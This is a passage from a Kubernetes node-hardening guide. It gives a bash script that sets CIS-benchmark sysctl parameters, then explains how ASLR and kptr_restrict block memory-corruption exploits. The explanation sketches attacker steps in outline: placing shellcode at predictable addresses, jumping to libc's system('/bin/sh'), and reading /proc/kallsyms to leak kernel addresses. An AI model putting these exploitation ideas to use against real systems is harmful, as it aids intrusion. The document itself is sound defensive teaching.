By default, Secrets stored in etcd are base64-encoded — NOT encrypted. Anyone with disk access can decode them. EncryptionConfiguration (Chapter 19) encrypts Secrets before they are written to etcd, so even a compromised etcd data directory reveals nothing.

16.6 Linux Kernel Hardening Parameters (sysctl)

The Linux kernel exposes hundreds of tunable parameters via sysctl. Many of these have direct security implications — they control IP forwarding, ICMP redirects, source routing, SYN flood protection, and address space layout randomization (ASLR). The CIS Benchmark specifies required values for production Kubernetes nodes:

CIS-Required Kernel Hardening via sysctl

Bash — /etc/sysctl.d/99-kubernetes-cis.conf — CIS kernel hardening 
#!/bin/bash
cat > /etc/sysctl.d/99-kubernetes-cis.conf << 'EOF'
# ═══════════════════════════════════════════════════════════
# CIS KUBERNETES BENCHMARK — Kernel Hardening Parameters
# ═══════════════════════════════════════════════════════════

# ── NETWORK HARDENING ──

# IP forwarding (REQUIRED for pod networking — DO NOT disable on K8s nodes)
net.ipv4.ip_forward = 1
net.ipv6.conf.all.forwarding = 1

# Disable ICMP redirects (prevent MITM redirect attacks)
# An attacker can send ICMP redirects to change routing tables
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0

# Disable source packet routing (prevent IP spoofing)
# Attackers use source routing to bypass firewall rules
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0

# Disable sending ICMP redirects (this node is not a router)
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0

# Enable TCP SYN cookie protection (DDoS SYN flood mitigation)
# When SYN queue is full, use SYN cookies instead of dropping connections
net.ipv4.tcp_syncookies = 1

# Enable reverse path filtering (prevent IP spoofing from pods)
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# ── MEMORY / ASLR HARDENING ──

# Maximum ASLR entropy (randomize memory addresses for all processes)
# 0 = no ASLR, 1 = partial, 2 = full (including heap and stack)
kernel.randomize_va_space = 2

# ── KERNEL POINTER / KEXEC RESTRICTIONS ──

# Restrict kernel pointer access in /proc (prevent info leaks)
kernel.kptr_restrict = 2

# Disable kexec (prevent replacing running kernel)
kernel.kexec_load_disabled = 1

# ── PROCESS / CORE DUMP RESTRICTIONS ──

# Restrict ptrace to direct child processes only
kernel.yama.ptrace_scope = 1

# Set core dump pattern (prevent core dumps from leaking memory contents)
kernel.core_pattern = |/bin/false
EOF

# Apply all sysctl changes
sysctl --system

# Verify key parameters
echo "=== Verifying CIS sysctl parameters ==="
sysctl net.ipv4.ip_forward
sysctl net.ipv4.conf.all.accept_redirects
sysctl net.ipv4.tcp_syncookies
sysctl kernel.randomize_va_space
sysctl kernel.kptr_restrict
sysctl kernel.yama.ptrace_scope

What each parameter actually does: accept_redirects=0 prevents an attacker on the same network from sending fake ICMP redirect messages that reroute your node's traffic through the attacker's machine. tcp_syncookies=1 defends against SYN flood DDoS by using cryptographic cookies instead of allocating connection state for half-open connections. randomize_va_space=2 randomizes the memory addresses of the stack, heap, and shared libraries — making it exponentially harder for attackers to exploit buffer overflow vulnerabilities because they cannot predict where their shellcode will land in memory.

How ASLR and kptr_restrict Stop Real Exploits — A Technical Deep Dive

Two of the most important sysctl parameters — kernel.randomize_va_space and kernel.kptr_restrict — work together to defeat memory corruption exploits. Understanding exactly HOW they work helps you appreciate why setting them correctly is non-negotiable:

ASLR + kptr_restrict — How They Defeat Exploits Together
  WITHOUT ASLR (randomize_va_space = 0):
  ────────────────────────────────────────
  Process memory layout is PREDICTABLE (same addresses every run):
  ┌─────────────────┐ 0x7fffffffffff
  │  Stack          │ ← ALWAYS at 0x7ffffffde000
  │  (function      │    Attacker knows exactly where their shellcode
  │   return addrs) │    will land. They craft the exploit to jump here.
  ├─────────────────┤ 0x7ffff7e00000
  │  Shared Libs    │ ← ALWAYS at 0x7ffff7a00000
  │  (libc.so, etc) │    Attacker knows libc's address and can call
  │                 │    system("/bin/sh") by jumping to its known offset.
  ├─────────────────┤ 0x555555554000
  │  Heap           │ ← ALWAYS at 0x555555758000
  │  (malloc data)  │    Attacker can spray heap with shellcode at known addr.
  ├─────────────────┤ 0x400000
  │  Code (.text)   │ ← ALWAYS at 0x400000
  └─────────────────┘

  EXPLOIT DEVELOPMENT: Attacker writes: jump_to(0x7ffffffde000 + offset)
  one time. Exploit works on EVERY run, EVERY machine with same kernel.

  WITH ASLR (randomize_va_space = 2):
  ─────────────────────────────────────
  Process memory layout is RANDOMIZED (different on every execution):
  ┌─────────────────┐ varying address
  │  Stack          │ ← Randomized: could be anywhere in a ~32TB range
  │                 │    (x86-64 has 48-bit virtual address space)
  ├─────────────────┤ varying address
  │  Shared Libs    │ ← Randomized: different offset per process
  ├─────────────────┤ varying address
  │  Heap           │ ← Randomized: brk() starts at random address
  ├─────────────────┤ varying address
  │  Code (.text)   │ ← Position-Independent Executable (PIE): randomized
  └─────────────────┘

  EXPLOIT DEVELOPMENT: Attacker needs an INFORMATION LEAK to discover
  where anything is in memory. This is where kptr_restrict comes in:

  WITH kptr_restrict = 0:
  ────────────────────────
  cat /proc/kallsyms shows ALL kernel symbol addresses:
  ffffffff81000000 T _text
  ffffffff81234567 T sys_execve
  ffffffff81800000 D init_task
  → Attacker now knows kernel addresses. Can craft kernel exploits.

  WITH kptr_restrict = 2:
  ────────────────────────
  cat /proc/kallsyms shows: 0000000000000000 T _text
                             0000000000000000 T sys_execve
  → All addresses hidden. Attacker has no kernel address information.
  → Must find ANOTHER information leak — much harder.

  COMBINED DEFENSE:
  ─────────────────
  ASLR randomizes USER-SPACE addresses (stack, heap, libs, code).
  kptr_restrict hides KERNEL-SPACE addresses (syscall table, kernel functions).
  Both needed: user exploits need ASLR bypass. Kernel exploits need kptr leak.
  Without both defenses, exploits become dramatically easier to write.
